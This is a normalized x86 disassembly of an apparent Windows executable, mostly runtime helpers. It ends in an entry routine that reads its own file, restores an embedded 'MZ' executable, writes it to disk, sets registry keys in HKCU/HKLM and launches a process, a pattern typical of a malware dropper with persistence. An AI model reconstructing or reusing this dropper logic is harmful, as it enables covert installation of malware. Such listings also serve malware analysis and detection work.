or [ ebp - 0x4 ] 0xffffffff
call sub_4be477
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_4b8999
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4be4a0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_4be501
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_4bd8f9
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_4b89a2
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_4bd8f9
push 0x1
mov edi eax
call sub_4bd8f9
cmp eax edi
pop ecx
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_4bd8f9
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_4bd87a
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
pop ecx
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4be584
push 0xc
push r--data
call sub_4b8944
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
jae r-xdata
call sub_4b8990
mov [ eax ] 0x9
call sub_4b8999
and [ eax ] 0x0
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
shl esi 0x2
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4bd93a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4b8990
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_4be501
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4b897f
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_4be5fb
mov eax [ ebp - 0x1c ]
jmp r-xdata
sub_4be61f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4b66ed
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4be660
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_4be650
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_4c2b20
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c2b70
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c2c90
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov edx [ eax + 0xd48 ]
push esi
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
pop esi
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4c2cd0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov edx [ eax + 0xd48 ]
push esi
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
pop esi
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4c35f0
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_461b30
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c3660
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c36b0
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c3700
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
sub_4c3760
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop ecx
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call $+5
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_4f8fe0
add esp 0x4
call sub_4f9110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_4f9140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0xd0
mov [ ebp - 0x128 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x653d3f3c
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_4f9140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x34
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x21
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x33
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_4f8fe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_4f8fe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_4f8fe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_4f8fe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_4f8fe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_4f8fe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_4f8fe0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
